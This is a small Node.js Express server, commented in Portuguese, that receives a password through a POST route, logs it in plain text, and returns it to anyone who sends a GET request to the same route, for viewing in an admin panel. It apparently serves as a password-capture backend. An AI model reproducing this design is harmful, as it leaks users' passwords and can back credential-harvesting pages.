const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

let senhaRecebida = '';

app.use(express.json());

// Serve arquivos estáticos da pasta "public"
app.use(express.static(path.join(__dirname, 'public')));

// Rota POST para receber a senha
app.post('/api/senha', (req, res) => {
  const { senha } = req.body;
  if (!senha) return res.status(400).json({ error: 'Senha não fornecida' });
  senhaRecebida = senha;
  console.log('Senha recebida:', senha);
  res.status(200).json({ message: 'Senha recebida com sucesso' });
});

// Rota GET para o painel admin buscar a senha
app.get('/api/senha', (req, res) => {
  res.json({ senha: senhaRecebida });
});

// Serve o index.html por padrão na raiz
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// (Opcional) Serve admin.html diretamente via URL
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
